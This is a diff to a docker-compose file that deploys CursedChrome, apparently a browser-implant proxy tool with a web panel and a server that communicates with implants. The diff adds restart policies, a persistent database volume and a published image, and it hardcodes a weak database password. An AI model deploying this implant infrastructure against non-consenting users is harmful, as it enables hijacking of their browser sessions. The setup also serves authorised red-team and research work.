@@ -1,16 +1,23 @@
 services:
   redis:
     image: "redis:alpine"
+    restart: unless-stopped
     command: redis-server --appendonly no
+
   db:
     image: postgres
-    restart: always
+    restart: unless-stopped
     environment:
       POSTGRES_PASSWORD: cursedchrome
       POSTGRES_USER: cursedchrome
       POSTGRES_DB: cursedchrome
+    volumes:
+      - postgres_data:/var/lib/postgresql/data
+
   cursedchrome:
+    image: ghcr.io/msknet/cursedchrome
     build: .
+    restart: unless-stopped
     volumes:
       - ./ssl:/work/cassl
     depends_on:
@@ -30,3 +37,6 @@ services:
       - "127.0.0.1:8080:8080" # Proxy server
       - "127.0.0.1:4343:4343" # WebSocket server (talks with implants)
       - "127.0.0.1:8118:8118" # Web panel
+
+volumes:
+  postgres_data: {}
